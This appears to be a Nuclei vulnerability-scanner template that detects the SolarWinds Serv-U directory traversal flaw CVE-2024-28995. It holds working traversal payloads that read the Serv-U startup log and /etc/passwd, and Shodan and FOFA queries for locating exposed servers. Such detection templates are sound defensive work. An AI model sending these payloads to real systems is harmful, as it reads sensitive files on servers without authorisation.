id: CVE-2024-28995


info:
  name: SolarWinds Serv-U - Directory Traversal
  author: DhiyaneshDK
  severity: high
  description: |
    SolarWinds Serv-U was susceptible to a directory transversal vulnerability that would allow access to read sensitive files on the host machine.
  reference:
    - https://attackerkb.com/topics/2k7UrkHyl3/cve-2024-28995/rapid7-analysis
    - https://nvd.nist.gov/vuln/detail/CVE-2024-28995
    - https://x.com/stephenfewer/status/1801191416741130575
  metadata:
    verified: true
    max-request: 1
    shodan-query: html:"Serv-U"
    fofa-query: app="Serv-U-FTP"
  tags: cve,cve2024,lfi,solarwinds,serv-u

http:
  - method: GET
    path:
      - '{{BaseURL}}/?InternalDir=/../../../../ProgramData/RhinoSoft/Serv-U/^&InternalFile=Serv-U-StartupLog.txt'
      - '{{BaseURL}}/?InternalDir=\..\..\..\..\etc^&InternalFile=passwd'

    stop-at-first-match: true
    matchers-condition: or
    matchers:
      - type: dsl
        dsl:
          - "contains(header_1, 'Server: Serv-U')"
          - 'contains(body_1, "Serv-U File Server")'
          - "status_code_1 == 200"
        condition: and

      - type: dsl
        dsl:
          - "contains(header_2, 'Server: Serv-U')"
          - "regex('root:.*:0:0:', body_2)"
          - "status_code_2 == 200"
        condition: and
